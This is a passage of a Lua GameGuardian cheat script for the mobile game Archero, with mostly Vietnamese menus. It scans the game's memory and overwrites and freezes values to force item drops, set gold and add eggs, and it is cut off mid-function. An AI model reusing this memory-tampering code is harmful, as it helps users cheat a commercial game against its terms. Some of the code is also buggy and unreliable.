-- on/off option
on = " [ On ] "
off = " [ Off ] "
local state = {on = '[ ON ] ', off = '[  OFF ] '}


-- Menu
function main()     --- main menu
	menu = gg.choice({
	"✡️Menu Hack khác🚻", --1
	"✡️Menu Rớt Đồ📥📥📥",--2
	"✡️Rớt loại đồ cần 🏹🛡",--3
	"✡️Nhân số lượng drop🏧🔢",--4
	"✡️Teleport🚧🚧🚧",--5
	"✡️Đổi sang skill xuyên tường🏃‍♂️🏃‍♂️🏃‍♂️",--6
	"✡️Nhảy 1 ngày⚡🔋",--7
	"✡️Menu Rớt Trứng🐣🐣🐣",--8
	"✡️Menu Ấp Trứng🐓🐓🐓",--9
	"✡️Rớt tối đa loại đồ trong 1 trận💎",--10
	"✡️Mở khóa Event (giả lập)🏧",--11
	"✡️Thay đổi số tiền 💰💰💰",--12
	"✡️Hack năng lượng (giả lập)⚡",--13
	"✡️Exit❌"--14
	}, nil, "🙉🙉🙉 Archero🎯 For friend only 🙉🙉🙉")
	if menu == 1   	then 	menuoth()		end
	if menu == 2	then 	menudrop()  	end
	if menu == 3   	then 	dropmeq()		end
	if menu == 4	then 	multi()  		end
	if menu == 5 	then 	telesand()  	end
	if menu == 6 	then 	SwapThroughWall()   	end
	if menu == 7 	then 	etenegry() 		end
	if menu == 8 	then 	menuegg()  		end
	if menu == 9 	then 	mhegg()   		end
	if menu == 10 	then 	multinm()  		end
	if menu == 11 	then 	event()  		end
	if menu == 12 	then 	golmax()   		end
	if menu == 13 	then 	engery()   		end
	if menu == 14 	then 	os.exit()	end
end

function menudrop() --- infi drop sub menu
  menud = gg.multiChoice({
    "✡️Hach vàng 💰💰💰",    --1
	  "✡️Rớt đồ vô tận ♋",     --2
    "✡️One Hit For Train♋♋♋",--3
    "✡️Rớt đá quý 💎💎",     --4
    "✡️Rớt 1 loại đồ🏹🛡",   --5
    "✡️Rớt 1 loại giấy 📜📜📜", --6
    "✡️Rớt 1 loại đá quý💎",    --7
	  "✡️Rớt đồ vô tận chế độ mỏ💣💣💣",--8
    "✡️Back↩️"--9
	}, nil, "🎯🎯🎯Select What You Want📥")
	if menud == nil then 	return				else
	  if (menud[1]) then	golact()			 end
	  if (menud[2]) then    dropinf()			 end
	  if (menud[3]) then    dropinf()
							dropmej()
							droperg()
							dropofic()
							golact()			 end
	  if (menud[4]) then    dropmej()			 end
	  if (menud[5]) then    dropofic()			 end
	  if (menud[6]) then    droperg()			 end
	  if (menud[7]) then    dropmotj()			 end
	  if (menud[8]) then    dropmym()			 end
	  if (menud[9])	then	main()				 end
	end
end

function menuegg()  --- egg sub menu
  dropo = gg.choice({
    "✡️Rớt trứng thường🥔", --1
    "✡️Rớt trứng boss🥔",      --2
    "✡️Dừng rớt trứng🥔", --3
    "✡️Back ↩️"   --5
  }, nil, "ℹChoose a type of Egg🥚 you want to collect📥")
  if dropo == 1 then    dropcomum()  		end
  if dropo == 2 then    dropboss()   		end
  if dropo == 3 then    degg()		 		end
  if dropo == 4 then    main()		 		end
end
function mhegg()
  menuhegg = gg.choice({
    "✡️Ấp trứng thường🥔",
    "✡️Ấp trứng boss🥔",
    "✡️Back↩️"
  }, nill, "ℹChoose an Egg🥔 you want to hatch📥")
  if menuhegg == 1 then    eggc()   end
  if menuhegg == 2 then    eggb()   end
  if menuhegg == 3 then    main()   end
end
function menuoth()
  menuother = gg.choice({
    "✡️Đổi skill (InGame)☯️",
    "✡️Đổi hết sang đồ đỏ👑",
	"✡️Chiến P (🦏 vs 🐊)",
    "✡️Back↩️"
  }, nil, "⚜⚜⚜ other hack ⚜⚜⚜")
  if menuother == 1   	then 		skin() 			end
  if menuother == 2   	then 		deck()  		end
  if menuother == 3   	then 		MSTbattle()  	end
  if menuother == 4 	then    	main()  		end

end


--- Drop fuction
function dropmym() --- multi drop Mystery mine
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("180~215;21774~35000Q;61101~63301::85", gg.TYPE_DWORD)
    local results = gg.getResults(gg.getResultsCount())
    for i, v in ipairs(results) do
      if v.value % 10 ~= 1 then
        results[i] = nil
	    end
    end
    gg.loadResults(results)
    gg.refineNumber("61101~63201", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    local t = gg.getResults(20, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.addListItems(t)
    t = nil
    gg.toast("\226\143\169Loading... 50% of 1/2")
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("257Q;6~666;8007~8666Q;1Q::113", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 1)
    gg.refineNumber("257", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
    revert = gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
    if gg.getResultsCount() < 1 then
      gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
    else
      revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
      r = gg.getResults(50)
	  local t = {}
      t[1] = {}
      t[1].address = r[1].address + 8
      t[1].flags = gg.TYPE_DWORD
      t[1].value = -1
      t[1].freeze = true
      gg.addListItems(t)
      gg.clearResults()
	  local t = {}
      t[1] = {}
      t[1].address = r[1].address + 28
      t[1].flags = gg.TYPE_DWORD
      t[1].value = -1
      t[1].freeze = true
      gg.addListItems(t)
      gg.clearResults()
      local t = {}
      t[1] = {}
      t[1].address = r[1].address + 52
      t[1].flags = gg.TYPE_DWORD
      t[1].value = -1
      t[1].freeze = true
      gg.addListItems(t)
      local t = {}
      t[1] = {}
      t[1].address = r[1].address + 76
      t[1].flags = gg.TYPE_DWORD
      t[1].value = 999999999
      t[1].freeze = true
      gg.addListItems(t)
      gg.clearResults()
	  gg.toast("🔌 Infinite Drops Activated✅ ...Success")
	end
	  t = gg.getListItems()
      gg.loadResults(t)
      gg.refineNumber("61101", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
	  revert = gg.getResults(1)
      gg.editAll("37003", gg.TYPE_DWORD)
	  gg.clearResults()

	  t = gg.getListItems()
      gg.loadResults(t)
      gg.refineNumber("62101", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
	  revert = gg.getResults(1)
      gg.editAll("61101", gg.TYPE_DWORD)
	  gg.clearResults()
	dropmotj()
	dropofic()
end
function dropOffIfi() --- Turn off inf for equip
	gg.clearResults()
	t = gg.getListItems()
	gg.loadResults(t)
	gg.refineNumber("999999999", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	revert = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)
	if gg.getResultsCount() < 1 then
      gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
    else
		r = gg.getResults(1)
		if stateEquip == off then
			r = gg.getResults(1)
			local t = {}
			t[1] = {}
			t[1].address = r[1].address - 32
			t[1].flags = gg.TYPE_DWORD
			t[1].value = 0
			t[1].freeze = false
			gg.addListItems(t)
			gg.setValues(t)
			gg.toast("%s ℹSuccess turn off equip infi📥")
			else
			r = gg.getResults(1)
			local t = {}
			t[1] = {}
			t[1].address = r[1].address - 32
			t[1].flags = gg.TYPE_DWORD
			t[1].value = -1
			t[1].freeze = true
			gg.addListItems(t)
			gg.setValues(t)
			gg.toast("%s ℹSuccess turn off equip infi📥")
		end
	end
end
function dropinf()  --- inf drop
		gg.clearResults()
		gg.setRanges(gg.REGION_ANONYMOUS)
		gg.searchNumber("180~215;21774~36000Q;61101~63301::85", gg.TYPE_DWORD)
		local results = gg.getResults(gg.getResultsCount())
		for i, v in ipairs(results) do
		  if v.value % 10 ~= 1 then
			results[i] = nil
		end
		end
		gg.loadResults(results)
		gg.refineNumber("61101~63301", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		local t = gg.getResults(20, nil, nil, nil, nil, nil, nil, nil, nil)
		gg.addListItems(t)
		gg.clearResults()

		gg.setRanges(gg.REGION_ANONYMOUS)
		gg.searchNumber("121;1086;31001::85", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 1)
		gg.refineNumber("31001", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
		revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
		gg.editAll("30107", gg.TYPE_DWORD)
		local t = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)
		gg.addListItems(t)
		gg.clearResults()

		gg.setRanges(gg.REGION_ANONYMOUS)
		gg.searchNumber("124;2371;35001::85", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 1)
		gg.refineNumber("35001", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
		revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
		gg.editAll("35001", gg.TYPE_DWORD)
		local t = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)
		gg.addListItems(t)
		gg.clearResults()

		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("61101", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		revert = gg.getResults(1)
		gg.editAll("61201", gg.TYPE_DWORD)
		gg.clearResults()

		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("61201", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		revert = gg.getResults(1)
		gg.editAll("35001", gg.TYPE_DWORD)
		gg.clearResults()

		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("62101", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		revert = gg.getResults(1)
		gg.editAll("32001", gg.TYPE_DWORD)
		gg.clearResults()

		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("62201", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		revert = gg.getResults(1)
		gg.editAll("38001", gg.TYPE_DWORD)
		gg.clearResults()

		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("62301", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		revert = gg.getResults(1)
		gg.editAll("38001", gg.TYPE_DWORD)
		gg.clearResults()

		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("63101", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		revert = gg.getResults(1)
		gg.editAll("35001", gg.TYPE_DWORD)
		gg.clearResults()

		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("63201", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		revert = gg.getResults(1)
		gg.editAll("61201", gg.TYPE_DWORD)
		gg.clearResults()

		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("63301", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
		revert = gg.getResults(1)
		gg.editAll("38001", gg.TYPE_DWORD)
		gg.clearResults()

    ----- infinitely -----
		gg.clearResults()
		gg.setRanges(gg.REGION_ANONYMOUS)
		gg.searchNumber("257Q;6~51;8007~8123Q;1Q::113", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 1)
		gg.refineNumber("257", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
		revert = gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
		if gg.getResultsCount() < 1 then
		  gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
		else
		  revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
		  r = gg.getResults(50)
		  local t = {}
		  t[1] = {}
		  t[1].address = r[1].address + 8
		  t[1].flags = gg.TYPE_DWORD
		  t[1].value = - 1
		  t[1].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[2] = {}
		  t[2].address = r[1].address + 12
		  t[2].flags = gg.TYPE_DWORD
		  t[2].value = -1
		  t[2].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[3] = {}
		  t[3].address = r[1].address + 16
		  t[3].flags = gg.TYPE_DWORD
		  t[3].value = -1
		  t[3].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[4] = {}
		  t[4].address = r[1].address + 20
		  t[4].flags = gg.TYPE_DWORD
		  t[4].value = -1
		  t[4].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[5] = {}
		  t[5].address = r[1].address + 24
		  t[5].flags = gg.TYPE_DWORD
		  t[5].value = -1
		  t[5].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[6] = {}
		  t[6].address = r[1].address + 28
		  t[6].flags = gg.TYPE_DWORD
		  t[6].value = -1
		  t[6].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[7] = {}
		  t[7].address = r[1].address + 32
		  t[7].flags = gg.TYPE_DWORD
		  t[7].value = -1
		  t[7].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[8] = {}
		  t[8].address = r[1].address + 36
		  t[8].flags = gg.TYPE_DWORD
		  t[8].value = 0
		  t[8].freeze = false
		  gg.addListItems(t)
		  local t = {}
		  t[9] = {}
		  t[9].address = r[1].address + 40
		  t[9].flags = gg.TYPE_DWORD
		  t[9].value = -1
		  t[9].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[10] = {}
		  t[10].address = r[1].address + 44
		  t[10].flags = gg.TYPE_DWORD
		  t[10].value = -1
		  t[10].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[11] = {}
		  t[11].address = r[1].address + 48
		  t[11].flags = gg.TYPE_DWORD
		  t[11].value = -1
		  t[11].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[12] = {}
		  t[12].address = r[1].address + 52
		  t[12].flags = gg.TYPE_DWORD
		  t[12].value = -1
		  t[12].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[13] = {}
		  t[13].address = r[1].address + 56
		  t[13].flags = gg.TYPE_DWORD
		  t[13].value = -1
		  t[13].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[14] = {}
		  t[14].address = r[1].address + 60
		  t[14].flags = gg.TYPE_DWORD
		  t[14].value = -1
		  t[14].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[15] = {}
		  t[15].address = r[1].address + 64
		  t[15].flags = gg.TYPE_DWORD
		  t[15].value = 0
		  t[15].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[16] = {}
		  t[16].address = r[1].address + 68
		  t[16].flags = gg.TYPE_DWORD
		  t[16].value = 999999999
		  t[16].freeze = true
		  gg.addListItems(t)
		  local t = {}
		  t[17] = {}
		  t[17].address = r[1].address + 72
		  t[17].flags = gg.TYPE_DWORD
		  t[17].value = -1
		  t[17].freeze = true
		  gg.addListItems(t)
		  gg.clearResults()
		  gg.toast("🔌 Infinite Drops Activated✅ ...Success")
		  gg.clearResults()
		end
end
function dropmej()  --- drop 1 jewel itemsSpec9
  local item = gg.choice(map(itemsSpec9, function(item)
    return item.name
  end), nil, "ℹWhich Gem do you want to Drop? 📥")
  if item == nil then
    return
  end
  gg.clearResults()
  gg.clearResults()
  t = gg.getListItems()
  gg.loadResults(t)
  gg.refineNumber("61101~63201", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  if gg.getResultsCount() < 1 then
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
    revert = gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll(itemsSpec9[item].id, gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast(string.format("%s ℹSuccess Drop Ativado📥", itemsSpec9[item].name), true)
  end
end
function dropmotj() --- drop 1 type jewel itemsSpec9
  local item = gg.choice(map(itemsSpec9, function(item)
    return item.name
  end), nil, "ℹ Which Jewelry do you want to Drop?  📥")
  if item == nil then
    return
  end
  gg.clearResults()
  t = gg.getListItems()
  gg.loadResults(t)
  gg.refineNumber("61101~63301", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  if gg.getResultsCount() < 1 then
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
    revert = gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
    gg.editAll(itemsSpec9[item].id, gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast(string.format("%s ℹSuccess Drop Ativado📥", itemsSpec9[item].name), true)
  end
end
function dropmeq()  --- drop 1 equip itemsSpec3
	gg.clearResults()
	t = gg.getListItems()
	gg.loadResults(t)
	gg.refineNumber("1010101~1070601", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	revert = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)
	if gg.getResultCount() >1 then
		gg.editAll("61201", gg.TYPE_DWORD)
		dropmej()
		gg.toast("%s Disable Success Drop Ativado📥")
		gg.clearResults()
	else
		gg.clearResults()
		t = gg.getListItems()
		gg.loadResults(t)
		gg.refineNumber("33001~33002", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
		revert = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)

    if gg.getResultCount() >1 then
      gg.editAll("61201", gg.TYPE_DWORD)
			dropmej()
			gg.toast("%s Disable Success Drop Ativado📥")
			gg.clearResults()
    else
      local itemType = gg.choice({
        "🔫 Weapons",
				"🔰 Armor",
				"💍 Rings",
				"🐂 Animals",
				"🔘 Medallions",
				"💫 Bracelets",
				"📚 Books",
				"🎗 Event"
      }, nil, "ℹWhat kind of equipment do you always want to collect? "
      )
      if itemType == nil then 	return   end
      local item = gg.choice(map(itemsSpec3[itemType], function(item)
        return item.name
      end), nil, "ℹWhat equipment do you want?\240\159\147\166")
      if item == nil then		return	  end
			t = gg.getListItems()
			gg.loadResults(t)
			gg.refineNumber("61101~63202", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
			revert = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)
			gg.editAll(itemsSpec3[itemType][item].id, gg.TYPE_DWORD)
			gg.toast(string.format("%s ℹSuccess Drop Ativado📥", itemsSpec3[itemType][item].name), true)
			gg.clearResults()
		end
	end
	gg.clearResults()
end
function dropofic()     --- drop 1 type equip itemsSpeccd 3
  local itemType = gg.choice({
    "🔫 Weapons",
    "🔰 Armor",
    "💍 Rings",
    "🐂 Animals",
    "🔘 Medallions",
    "💫 Bracelets",
    "📚 Books"
  }, nil, "ℹWhat kind of equipment do you always want to collect? ")
  if itemType == nil then
    return
  end
  local item = gg.choice(map(itemsSpec3[itemType], function(item)
    return item.name
  end), nil, "ℹWhat equipment do you want?\240\159\147\166")
  if item == nil then
    return
  end
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("2Q;1010101~1070602;1Q::29", gg.TYPE_DWORD, false, gg.SIGN_EQUAL)
  gg.refineNumber("1010101~1070602", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  revert = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil)
  local t = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil)
  local newValues = {}
  for i, v in ipairs(t) do
	  if v.value % 10 == 1 then
		 v.value = itemsSpec3[itemType][item].id
		 table.insert(newValues, v)
		elseif v.value % 10 == 2 then
		 v.value = itemsSpec3[itemType][item].id + 1
		 table.insert(newValues, v)
	  end
  end
  gg.setValues(newValues)
  gg.clearResults()
end
function droperg()  --- drop 1 type scroll itemsScroll
  local item = gg.choice(map(itemsScroll, function(item)
    return item.name
  end), nil, "ℹWhich Scroll do you want to Drop?? 📥")
  if item == nil then
    return
  end
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("116~200;156~1000;30101~30107;1::105", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  gg.refineNumber("30101~30107", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  revert = gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
  if gg.getResultsCount() < 1 then
    gg.clearResults()
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
    gg.editAll(itemsScroll[item].id, gg.TYPE_DWORD)
	  gg.clearResults()
	  t = gg.getListItems()
    gg.loadResults(t)
    gg.refineNumber("30101~30107", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
	  revert = gg.getResults(1)
    gg.editAll(itemsScroll[item].id, gg.TYPE_DWORD)
	  gg.clearResults()
    gg.toast("The selected Scroll will always Drop now")
    gg.clearResults()
    gg.toast(string.format("%s ℹSuccess Drop Ativado📥", itemsScroll[item].name), true)
  end
end

--- gold fuction
function golact() --- fuction search gold
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("10~20;1000000000~2300000000Q;500000~50000000;1000000000~2300000000;1Q::81", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("10~20;1000000000~2300000000Q;500000~50000000;1000000000~2300000000;1Q::81", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.refineNumber("1000000000~2300000000Q;500000~50000000;1000000000~2300000000;1Q::17", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
	  gg.refineNumber("1000000000~2300000000Q;500000~50000000;1000000000~2300000000::13", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
    gg.toast("⚠️Collect more gold then tap the 👉 GG icon to continue♨️")
    while true do
      if gg.isVisible() then
        gg.setVisible(false)
        gg.searchFuzzy("0", gg.SIGN_FUZZY_NOT_EQUAL)
		    gg.refineNumber("1000000000~2300000000Q;500000~50000000;1000000000~2300000000::13", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
        cnt = gg.getResultCount()
        if cnt == 0 then
          gg.alert("⚠️No Results, Try Again, if the error persists Restart the game and do this same Process again😪")
          break
        end
        if cnt < 4 then
          r = gg.getResults(3, nil, nil, nil, nil, nil, nil, nil, nil)
          gg.alert("ℹCongratulations🎉🎊 Hacked Success♨️️ Gold Ativado✅")
		      local config = loadConfig()
          local x = gg.prompt({
            string.format("ℹHow much gold do you want to Insert✅")
          },config.goldl or {[1]=385}, {"number"})
          if x == nil then
            return
          end
		      config.goldl = values
		      saveConfig(config)
          r = gg.getResults(3)
          local t = {}
          t[1] = {}
          t[1].address = r[1].address
          t[1].flags = gg.TYPE_QWORD
          t[1].value = x[1] * 1000000
          t[1].freeze = true
          gg.setValues(t)
          gg.addListItems(t)
          t[1] = {}
          t[1].address = r[2].address
          t[1].flags = gg.TYPE_DWORD
          t[1].value = 0
          t[1].freeze = true
          gg.setValues(t)
          gg.addListItems(t)
          t[1] = {}
          t[1].address = r[3].address
          t[1].flags = gg.TYPE_DWORD
          t[1].value = 0
          t[1].freeze = true
          gg.setValues(t)
          gg.addListItems(t)
          gg.toast("ℹSuccess... 🚦Start with Gold💰 Maximum Limited Enabled✅")
          gg.clearResults()
          break
        end
        gg.alert("⚠️Collect more gold then tap the 👉 GG icon to continue♨️")
        gg.toast("⚠️Collect more gold then tap the 👉 GG icon to continue♨️")
      end
      gg.sleep(100)
    end
end
function golmax() --- gold max imput
  gg.clearResults()
  t = gg.getListItems()
  gg.loadResults(t)
  gg.refineNumber("5000000~2000000000Q;0~50000000;0~2000000000::13", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  gg.refineNumber("5000000~2000000000Q;0;0::13", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  if gg.getResultsCount() < 1 then
    gg.alert("Oops it looks like you didn't turn on the Trigger, make sure it's Enabled and try again otherwise you'll need to restart the game")
  else
    local config = loadConfig()
    local values = gg.prompt({
      string.format("ℹHow Much Gold💰 Do You Want to Start?✅")
    }, config.goldm or {}, {"number"})
    if values == nil then
      return
    end
	config.goldm = values
	saveConfig(config)
    revert = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)
    r = gg.getResults(10)
    local t = {}
    t[1] = {}
    t[1].address = r[1].address
    t[1].flags = gg.TYPE_QWORD
    t[1].value = values[1] * 1000000
    t[1].freeze = true
    gg.setValues(t)
    gg.addListItems(t)
    t[1] = {}
    t[1].address = r[2].address
    t[1].flags = gg.TYPE_DWORD
    t[1].value = 0
    t[1].freeze = true
    gg.setValues(t)
    gg.addListItems(t)
    t[1] = {}
    t[1].address = r[3].address
    t[1].flags = gg.TYPE_DWORD
    t[1].value = 0
    t[1].freeze = true
    gg.setValues(t)
    gg.addListItems(t)
    gg.clearResults()
    gg.toast("ℹSuccess... 🚦Start with Gold💰 Maximum Limited Enabled✅")
  end
end

--- egg drop&hatch fuction
function dropcomum() --- egg nomarl drop
  local item = gg.choice(map(itemsEgg, function(item)
    return item.name
  end), nil, "ℹ Which Boss Egg do you want to drop? 🥔\n")
  if item == nil then
    return
  end
  t = gg.getListItems()
  gg.loadResults(t)
  gg.refineNumber("38001", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
  if gg.getResultsCount() < 1 then
	gg.clearResults()
	gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
	gg.editAll(itemsEgg[item].id, gg.TYPE_DWORD)
	gg.toast(string.format("%s ℹSuccess Drop Ativado📥", itemsEgg[item].name), true)
	gg.clearResults()
  end
end
function dropboss()  --- egg boss drop
  local item = gg.choice(map(itemsBoss, function(item)
    return item.name
  end), nil, "ℹ Which Boss Egg do you want to drop? 🥔\n")
  if item == nil then
    return
  end
  t = gg.getListItems()
  gg.loadResults(t)
  gg.refineNumber("38001", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
  if gg.getResultsCount() <1 then
	gg.clearResults()
	gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
	gg.editAll(itemsBoss[item].id, gg.TYPE_DWORD)
	gg.toast(string.format("%s ℹSuccess Drop Ativado📥", itemsBoss[item].name), true)
	gg.clearResults()
  end
end
function degg()      --- Disable egg drop
  gg.clearResults()
  t = gg.getListItems()
  gg.loadResults(t)
  gg.refineNumber("40001~41015", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
  gg.editAll("38001", gg.TYPE_DWORD)
  gg.toast("🔌Drop Eggs Deactivated✅!...")
  gg.clearResults()
end
function eggc()
  gg.clearResults()
  local item = gg.choice(map(itemshnegg, function(item)
    return item.name
  end), nil, "ℹ Which Boss Egg you want to add for hatching 🥔")
  if item == nil then
    return
  end
  local config = loadConfig()
  local x = gg.prompt({
    string.format("ℹHow many eggs of common creatures do you want to add to the hatch🥔")
  }, config.eggbCF or {}, {"number"})
  if x == nil then
    return
  end
  config.eggbCF = values
  saveConfig(config)
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber(itemshnegg[item].id .. ";-10~10;" .. itemshnegg[item].id .. ";1~100" .. "::13", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  gg.refineNumber("1~100", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  revert = gg.getResults(120, nil, nil, nil, nil, nil, nil, nil, nil)
  if 1 > gg.getResultsCount() then
    gg.clearResults()
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
    gg.editAll(x[1], gg.TYPE_DWORD)
    gg.toast("%s ℹSuccess hatch Ativado📥")

  end
end
function eggb()
  gg.clearResults()
  local item = gg.choice(map(itemshbossegg, function(item)
    return item.name
  end), nil,"ℹ Which Boss Egg you want to add for hatching 🥔")
  if item == nil then
    return
  end
  local config = loadConfig()
  local x = gg.prompt({
    string.format("ℹHow many Boss Eggs do you want to add to hatch🥔")
  }, config.eggcCF or {}, {"number"})
  if x == nil then
    return
  end
  config.eggcCF = values
  saveConfig(config)
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber(itemshbossegg[item].id .. ";-10~10;" .. itemshbossegg[item].id .. ";1~9" .. "::13", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  gg.refineNumber("1~9", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  revert = gg.getResults(120, nil, nil, nil, nil, nil, nil, nil, nil)
  if 1 > gg.getResultsCount() then
    gg.clearResults()
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else

    gg.editAll(x[1], gg.TYPE_DWORD)
    gg.toast("%s ℹSuccess hatch Ativado📥")

  end
end


---multi fuction

function multinm()  --- multi drop normal map
  gg.clearResults()
  local config = loadConfig()
  local values = gg.prompt({
    "ℹHow many chip did you drop?📥 ",
    }, config.chip or {"22"}, {"number"})
  if values == nil then
    return
  end
  config.chip = values
  saveConfig(config)
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("1000000000D~3000000000;1000000000D~3000000000;1Q;2~115;4294967295Q;4294967296Q;1D::33", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  gg.refineNumber("2~115", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
  if 1 > gg.getResultsCount() then
    gg.alert("⚠️Couldn't activate this hack at the moment!♨️ ...\n\nℹTry again or restart the game😪")
  else
